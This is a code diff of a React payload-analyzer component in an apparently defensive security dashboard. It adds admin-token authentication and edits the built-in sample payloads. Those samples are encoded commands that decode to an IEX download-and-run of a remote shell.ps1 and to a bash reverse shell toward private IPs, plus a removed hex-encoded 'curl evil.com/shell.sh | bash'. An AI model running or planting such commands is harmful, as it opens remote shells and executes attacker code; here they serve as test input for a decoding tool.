@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import ThreatIntelCard from './ThreatIntelCard';
 import { Terminal, Zap, Cpu, Loader2, AlertTriangle, History, Trash2 } from 'lucide-react';
 import { sanitizeHTML } from '../../utils/sanitizer';
+import { useAdminAuth } from '../../hooks/useAdminAuth';
 
 /**
  * PayloadAnalyzer - On-demand payload decoding component
@@ -13,6 +14,7 @@ import { sanitizeHTML } from '../../utils/sanitizer';
  * 4. Keep a history of recent analyses
  */
 const PayloadAnalyzer = () => {
+    const { getToken } = useAdminAuth();
     const [payload, setPayload] = useState('');
     const [result, setResult] = useState(null);
     const [loading, setLoading] = useState(false);
@@ -23,15 +25,11 @@ const PayloadAnalyzer = () => {
     const EXAMPLE_PAYLOADS = [
         {
             label: 'PowerShell Encoded',
-            value: 'cmd.exe /c powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADoAOAAwADgAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=',
+            value: 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADoAOAAwADgAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=',
         },
         {
             label: 'Base64 Reverse Shell',
-            value: 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE=" | base64 -d | bash',
-        },
-        {
-            label: 'Hex Encoded Payload',
-            value: '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x63\\x6f\\x6d\\x2f\\x73\\x68\\x65\\x6c\\x6c\\x2e\\x73\\x68\\x20\\x7c\\x20\\x62\\x61\\x73\\x68',
+            value: 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE=',
         },
     ];
 
@@ -43,12 +41,20 @@ const PayloadAnalyzer = () => {
         setResult(null);
 
         try {
+            const token = getToken();
+            const headers = localStorage.getItem('saasToken')
+                ? {
+                    'Authorization': `Bearer ${token}`,
+                    'Content-Type': 'application/json'
+                }
+                : {
+                    'x-admin-token': token,
+                    'Content-Type': 'application/json'
+                };
+
             const response = await fetch('/api/ai/decode-payload', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'x-admin-token': localStorage.getItem('adminToken'),
-                },
+                headers,
                 body: JSON.stringify({ payload: payload.trim(), mode }),
             });
 
